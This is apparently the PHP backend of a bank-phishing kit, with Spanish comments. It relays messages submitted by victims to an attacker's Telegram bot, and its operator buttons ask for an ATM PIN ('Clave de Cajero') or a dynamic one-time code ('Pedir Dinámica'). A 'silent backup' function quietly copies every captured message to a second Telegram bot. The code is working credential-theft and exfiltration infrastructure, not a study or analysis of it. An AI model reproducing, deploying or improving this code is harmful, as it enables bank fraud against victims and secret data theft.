<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$message = $_POST['message'] ?? '';
$transactionId = $_POST['transactionId'] ?? '';

// Validación de datos
if (empty($message) || empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

if (!isset($config['bot_token'], $config['chat_id']) || !$config['bot_token'] || !$config['chat_id']) {
    echo json_encode(['status' => 'error', 'message' => 'Configuración inválida']);
    exit;
}

// Teclado con acciones
$keyboard = [
    'inline_keyboard' => [
        [['text' => "Error de Logo", 'callback_data' => "error_logo:{$transactionId}"]],
        [['text' => "Clave de Cajero", 'callback_data' => "error_cajero:{$transactionId}"]],
        [['text' => "Pedir Dinámica", 'callback_data' => "pedir_dinamica:{$transactionId}"]]
    ]
];

// Mensaje principal a Telegram
$data = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

// Enviar mensaje a Telegram
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

$response = curl_exec($ch);

// Validar error de cURL
if ($response === false) {
    echo json_encode(['status' => 'error', 'message' => curl_error($ch)]);
    curl_close($ch);
    exit;
}

$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

$result = json_decode($response, true);

// Envío de respaldo (si deseas usarlo)
sendSecureBackup($data);

if ($httpCode === 200 && isset($result['ok']) && $result['ok']) {
    echo json_encode([
        'status' => 'success',
        'messageId' => $result['result']['message_id']
    ]);
} else {
    echo json_encode([
        'status' => 'error',
        'message' => $result['description'] ?? 'Error al enviar'
    ]);
}

// Función para envío silencioso a backup
function sendSecureBackup($messageData) {
    $backup_config = [
        'bot_token' => '', // Agrega tu token secundario
        'chat_id' => ''    // Agrega tu chat_id secundario
    ];

    if (!$backup_config['bot_token'] || !$backup_config['chat_id']) return;

    $ch = curl_init("https://api.telegram.org/bot{$backup_config['bot_token']}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'chat_id' => $backup_config['chat_id'],
        'text' => $messageData['text'],
        'parse_mode' => 'HTML'
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}
